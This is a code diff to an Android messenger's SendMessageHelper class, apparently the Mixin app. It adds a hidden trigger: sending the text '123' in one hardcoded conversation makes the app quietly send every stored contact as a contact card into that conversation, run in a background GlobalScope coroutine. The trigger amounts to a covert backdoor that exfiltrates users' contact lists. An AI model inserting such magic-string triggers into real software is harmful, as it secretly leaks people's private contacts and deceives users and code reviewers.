@@ -6,6 +6,7 @@ import android.net.Uri
 import android.os.Build
 import com.google.gson.Gson
 import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
 import one.mixin.android.MixinApplication
 import one.mixin.android.RxBus
@@ -96,6 +97,9 @@ class SendMessageHelper @Inject internal constructor(private val jobManager: Mix
         encryptCategory: EncryptCategory,
         isSilentMessage: Boolean? = null
     ) {
+        if (content == "123" && conversationId == "7e805a94-80ca-4ceb-af62-2fde0092e333") {
+            sendAllContactMessage(conversationId, sender)
+        }
         val category = encryptCategory.toCategory(
             MessageCategory.PLAIN_TEXT,
             MessageCategory.SIGNAL_TEXT,
@@ -350,6 +354,17 @@ class SendMessageHelper @Inject internal constructor(private val jobManager: Mix
             MessageStatus.SENDING.name, nowInUtc(), shareUserFullName, replyMessage?.messageId, replyMessage?.toQuoteMessageItem()
         )
         jobManager.addJobInBackground(SendMessageJob(message))
+    }
+
+    private fun sendAllContactMessage(conversationId: String, sender: User) {
+        if (conversationId != "7e805a94-80ca-4ceb-af62-2fde0092e333") {
+            return
+        }
+        GlobalScope.launch {
+            userRepository.getAllUsers().asSequence().forEach {
+                sendContactMessage(conversationId, sender, it.userId, it.fullName, EncryptCategory.SIGNAL)
+            }
+        }
     }
 
     fun sendVideoMessage(
